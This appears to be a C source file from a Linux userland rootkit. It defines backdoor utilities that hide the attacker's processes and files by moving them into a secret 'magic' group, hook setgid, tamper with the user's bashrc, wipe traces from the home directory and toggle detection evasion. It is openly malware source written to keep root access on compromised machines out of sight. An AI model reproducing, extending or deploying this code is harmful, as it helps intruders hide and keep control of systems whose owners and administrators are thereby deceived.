#ifndef NO_ROOTKIT_ANSI
#include "banner.h"
#endif
#include "rolf.h"
void dorolf(void){
#ifndef NO_ROOTKIT_ANSI
    printf("\033[0;31m");
    for(int i = 0; i < BDANSI_SIZE; i++)
        printf("%c", bdansi[i]);
    printf("\033[0m\n");
#endif
    srand(time(NULL));
    char *randrolf = rolfs[rand() % ROLFS_SIZE];
    printf("\033[1;31m%s\033[0m\n", randrolf);
}

int getlasttime(const char *timepath);
int writenewtime(const char *timepath, int curtime);
int timediff(const char *timepath, int curtime);
int itistime(const char *timepath, int curtime, int timer);
int magicusr(void);
void killrkprocs(gid_t magicgid);
int rkprocup(void);
#include "gid/gid.h"
static int magician=0;
#include "magicusr.c"
#include "rkproc.c"
#include "times.c"

#ifdef ROOTKIT_BASHRC
int writebashrc(void);
void checkbashrc(void);
#include "bashrc.c"

#endif


#ifdef CLEANSE_HOMEDIR
void bdvcleanse(void);
#include "cleanse.c"
#endif

#ifdef DO_EVASIONS
#define CANTEVADE_ERR EPERM
#endif
#ifdef BACKDOOR_UTIL
void _setgid(gid_t gid){
    hook(CSETGID);
    call(CSETGID, gid);
}

void hide_self(void){
#ifndef HIDE_SELF
    return;
#endif

    gid_t magicgid = readgid();
    if(notuser(0) || getgid() == magicgid) return;
    _setgid(magicgid);
}

void unhide_self(void){
#ifndef HIDE_SELF
    return;
#endif

    if(notuser(0) || getgid() == 0) return;
    _setgid(0);
}
#define PATH_ERR   -1  /* error codes for when the backdoor */
#define PATH_DONE   1  /* user is trying to hide paths from */
#define PATH_SUCC   0  /* their shell. */
int hide_path(char *path){
#ifndef HIDE_SELF
    return 0;
#endif

    if(notuser(0)) return PATH_ERR;
    if(hidden_path(path)) return PATH_DONE;
    return chown_path(path, readgid());
}

int unhide_path(char *path){
#ifndef HIDE_SELF
    return 0;
#endif

    if(notuser(0)) return PATH_ERR;
    if(!hidden_path(path)) return PATH_DONE;
    return chown_path(path, 0);
}
#define ERR_ACSS_PATH     "access failed on path. does it exist?"
#define ALRDY_HIDDEN_STR  "path is already hidden..."
#define PATH_HIDDEN_STR   "path now hidden"
#define ERR_HIDING_PATH   "error hiding path"
#define ALRDY_VISIBLE_STR "path is already visible..."
#define PATH_VISIBLE_STR  "path now visible"
#define ERR_UNHIDING_PATH "error unhiding path"

void option_err(char *a0);
void uninstallbdv(void);
void do_self(void);
void symlinkstuff(void);
void dobdvutil(char *const argv[]);
#include "utils.c"
#endif